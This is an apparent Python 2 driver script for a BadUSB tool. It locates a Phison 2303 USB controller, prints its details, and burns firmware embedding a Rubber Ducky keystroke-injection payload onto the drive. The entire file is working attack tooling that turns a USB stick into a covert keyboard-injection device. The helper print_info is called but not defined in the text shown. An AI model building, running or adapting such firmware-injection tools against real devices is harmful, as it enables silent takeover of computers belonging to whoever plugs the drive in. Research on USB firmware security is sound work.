from pybadusb import badusb, phison
import argparse
import sys

# default parameters
win_device_path_default = 'H'
linux_device_path_default = '/dev/sg2'
firmware_default = 'bin/fw.bin'
burner_default = 'bin/BN03V114M.BIN'
payload_default = 'rubberducky/inject.bin'

def main():
	parser = argparse.ArgumentParser(prog='python -m {}'.format(__package__))
	
	# device arguments
	if 'win' in sys.platform.lower():
		parser.add_argument('--device', default=win_device_path_default, help='Path to the device. Default is \'{}\''.format(win_device_path_default))
	elif 'linux' in sys.platform.lower():
		parser.add_argument('--device', default=linux_device_path_default, help='Path to the device. Default is \'{}\''.format(linux_device_path_default))
	else:
		parser.add_argument('device', help='Path to the device')
	
	# binary path arguments
	parser.add_argument('--firmware', default=firmware_default, help='Path to the base firmware image to inject. Default is \'{}\''.format(firmware_default))
	parser.add_argument('--burner', default=burner_default, help='Path to the burner image for the device. Default is \'{}\''.format(burner_default))
	parser.add_argument('--payload', default=payload_default, help='Path to payload to inject into firmware. Default is \'{}\''.format(payload_default))
	
	args = parser.parse_args()
	
	payload  = args.payload
	firmware = args.firmware
	burner   = args.burner
	
	# Connecting to device
	print 'Getting device..'
	
	device = badusb.get_device(phison.Phison2303, args.device)
	if not device:
		print 'Device not found!'
		exit()
	
	# Getting device information
	print 'Updating device data...'
	
	if not device.get_info():
		print 'Failed getting info!'
		device.close()
		exit()
	
	print_info(device)
	
	# Creating new firmware and injecting it to device
	print 'Embeding payload and burning it...'
	if not badusb.badusb(device, payload, firmware, burner):
		print 'Failed burning payload!'
		exit()
	
	print 'Finished!'
	device.close()

if __name__ == '__main__':
	main()
